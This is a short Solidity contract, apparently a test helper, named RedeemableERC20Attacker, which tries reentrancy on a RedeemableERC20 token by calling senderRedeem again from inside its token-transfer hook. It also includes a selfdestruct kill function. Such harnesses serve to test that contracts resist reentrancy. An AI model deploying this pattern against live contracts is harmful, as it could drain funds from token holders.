// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {RedeemableERC20} from "../RedeemableERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

contract RedeemableERC20Attacker is ERC20 {
    uint256 private constant BONE = 10**18;
    RedeemableERC20 public token;

    constructor(address victim_) public ERC20("Attacker", "ATK") {
        token = RedeemableERC20(victim_);
    }

    function kill() external {
        selfdestruct(msg.sender);
    }

    function attack() external {
        token.senderRedeem(BONE);
    }

    function _beforeTokenTransfer(
        address sender_,
        address receiver_,
        uint256 amount_
    ) internal virtual override {
        super._beforeTokenTransfer(sender_, receiver_, amount_);
        console.log("_beforeTokenTransfer triggered");
        token.senderRedeem(BONE);
    }
}
